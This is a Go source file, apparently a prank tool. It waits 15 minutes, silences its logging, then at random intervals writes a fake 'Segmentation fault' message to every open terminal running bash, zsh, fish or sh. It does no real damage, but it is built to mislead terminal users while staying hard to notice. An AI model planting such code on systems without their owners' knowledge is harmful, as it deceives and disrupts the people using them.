package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"time"
)

func main() {
	time.Sleep(15 * time.Minute)
	log.SetOutput(ioutil.Discard)

	for {
		time.Sleep(time.Minute + (time.Second * time.Duration(rand.Intn(360))))
		run()
	}
}

func run() {
	ttys := getTTYs()
	procs := getProcs()

	proc0Map := make(map[int]string, len(procs))
	for _, proc := range procs {
		proc0Map[proc] = getProcessFd0(proc)
	}

	for _, tty := range ttys {
		for _, proc := range procs {
			if proc0Map[proc] == tty {
				// Check if it's a shell.
				exe := getProcessExecutable(proc)
				if isExeShell(exe) {
					segFault(tty)
				}
			}
		}
	}
}

var isNumber = regexp.MustCompile("^[0-9]*$")

func getProcs() []int {
	files, err := ioutil.ReadDir("/proc")
	if err != nil {
		log.Println("read dir", err.Error())
		return nil
	}

	processList := make([]int, 0)
	for _, f := range files {
		if f.IsDir() && isNumber.MatchString(f.Name()) {
			i, err := strconv.Atoi(f.Name())
			if err != nil {
				continue
			}
			processList = append(processList, i)

			// processList = append(processList, filepath.Join("/proc", f.Name()))
		}
	}

	return processList
}

func getTTYs() []string {
	files, err := ioutil.ReadDir("/dev/pts")
	if err != nil {
		log.Println("read dir", err.Error())
		return nil
	}

	ttyList := make([]string, 0)
	for _, f := range files {
		if !f.IsDir() && isNumber.MatchString(f.Name()) {
			ttyList = append(ttyList, filepath.Join("/dev/pts", f.Name()))
		}
	}

	return ttyList
}

func getProcessFd0(proc int) string {
	path := fmt.Sprintf("/proc/%v/fd/0", proc)
	link, err := os.Readlink(path)
	if err != nil {
		log.Println("readlink", path, err.Error())
		return ""
	}

	return link
}

func getProcessExecutable(proc int) string {
	path := fmt.Sprintf("/proc/%v/exe", proc)
	exe, err := os.Readlink(path)
	if err != nil {
		log.Println("readlink", path, err.Error())
		return ""
	}

	return exe
}

func isExeShell(exe string) bool {
	switch filepath.Base(exe) {
	case "bash", "zsh", "fish", "sh":
		return true
	}

	return false
}

func segFault(tty string) {
	f, err := os.OpenFile(tty, os.O_RDWR|os.O_SYNC, 0o777)
	if err != nil {
		log.Println("open", tty, err.Error())
		return
	}
	defer f.Close()

	_, err = f.Write([]byte("\nSegmentation fault\n"))
	if err != nil {
		log.Println("write segfault", tty, err.Error())
		return
	}
}
